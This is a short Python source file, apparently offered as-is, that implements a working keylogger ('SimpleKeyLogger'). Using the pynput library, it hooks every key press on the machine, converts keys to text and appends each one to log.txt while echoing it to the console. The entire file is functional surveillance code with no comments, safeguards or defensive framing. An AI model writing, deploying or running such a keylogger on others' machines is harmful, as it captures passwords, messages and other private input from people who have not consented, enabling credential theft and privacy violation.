import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):  
        self.logger = ""

    def append_to_log(self, key_strike):
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(key_strike)
        print(key_strike) 
    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)  
        except AttributeError:
            if key == pynput.keyboard.Key.space:  
                pressed_key = " "  
            else:
                pressed_key = " " + str(key) + " "  
        self.append_to_log(pressed_key) 
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()  
if __name__ == "__main__":
    SimpleKeyLogger().start()  
